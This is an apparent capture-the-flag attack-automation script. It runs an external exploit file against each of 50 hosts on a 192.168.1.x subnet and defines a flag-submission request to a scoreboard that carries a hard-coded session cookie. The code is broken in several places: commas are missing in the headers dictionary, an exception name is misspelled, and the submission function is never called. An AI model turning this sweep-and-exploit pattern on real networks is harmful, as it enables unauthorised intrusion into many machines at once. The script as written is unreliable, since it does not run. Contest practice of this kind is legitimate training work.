from pwn import *
import sys
import requests
import os

headers = {
"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
"Cookie": "JSESSIONID=83A3079AA9864C6EDBE15D2182659FAE"
"Host": "172.91.1.12:9090"
"Origin": "http://172.91.1.12:9090"
"Referer": "http://172.91.1.12:9090/arace/index"
"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
"X-Requested-With": "XMLHttpRequest"
}
def submitflag(flag):
	data = {"flag":flag}
	requests.post("http://172.91.1.12:9090/ad/hacker/submit/submitCode",headers=headers,data=data)

for i in range(50):
	try:
		ip = "192.168.1.{ip}".format(ip=i)
		os.system("python pwn1.py {ip} {port}".format(ip=ip,port=9983))
	except keyboardcorrupt:
		break
	except:
		continue
